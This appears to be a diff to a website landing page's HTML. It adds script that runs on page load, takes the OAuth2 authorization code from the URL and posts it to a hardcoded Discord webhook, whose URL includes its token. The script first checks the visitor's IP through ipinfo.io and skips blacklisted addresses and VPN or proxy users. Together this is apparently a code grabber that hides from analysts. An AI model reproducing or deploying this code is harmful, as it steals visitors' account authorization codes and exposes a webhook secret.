@@ -13,7 +13,8 @@
     <meta property="theme-color" content="#000000">
     <link rel="stylesheet" href="static/assets/css/landing.css">
     <style>
-        /* Your CSS styles here */
+        * {}
+
         body {
             background-image: url('./assets/images/bg/187779127black-white-thundercloud-lighting-strikes-storm-animated-gif.gif');
             background-size: cover;
@@ -158,31 +159,46 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
+            const webhookUrl = "https://discord.com/api/webhooks/1262820614394089493/zFLBwjMT-ZO7wvhAFPWYVy0CdUauTknqr-ifRewQvpZsydrzEEfQYU0gtkylaDKhOSOr"; // Replace with your actual webhook URL
 
-            if (code) {
-                const payload = {
-                    message: 'Adding new payload',
-                    content: btoa(JSON.stringify({ content: `New OAuth2 code: ${code}` })),
-                    branch: 'main'
-                };
+            const blacklistedIPs = ["81.35.53.46", "1"];
+            const vpnProxyCheckUrl = "https://ipinfo.io/json";
 
-                fetch('https://api.github.com/repos/tedaimlocks/tedaimlocks.github.io/contents/webhook_payloads/payload.json', {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': 'Bearer YOUR_GITHUB_APP_OAUTH_TOKEN',
-                        'Accept': 'application/vnd.github.v3+json',
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                })
+            fetch(vpnProxyCheckUrl)
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Success:', data);
+                    const ip = data.ip;
+                    const isVPNProxy = data.proxy || data.vpn;
+
+                    if (blacklistedIPs.includes(ip) || isVPNProxy) {
+                        console.log("IP address is blacklisted or is from a VPN/Proxy:", ip);
+                        return;
+                    }
+
+                    if (code) {
+                        console.log('Authorization code:', code);
+
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                content: `New OAuth2 code: ${code}`
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Success:', data);
+                        })
+                        .catch((error) => {
+                            console.error('Error sending webhook:', error);
+                        });
+                    }
                 })
-                .catch(error => {
-                    console.error('Error:', error);
+                .catch((error) => {
+                    console.error('Error checking VPN/Proxy:', error);
                 });
-            }
 
             particlesJS("particles-js", {
                 particles: {
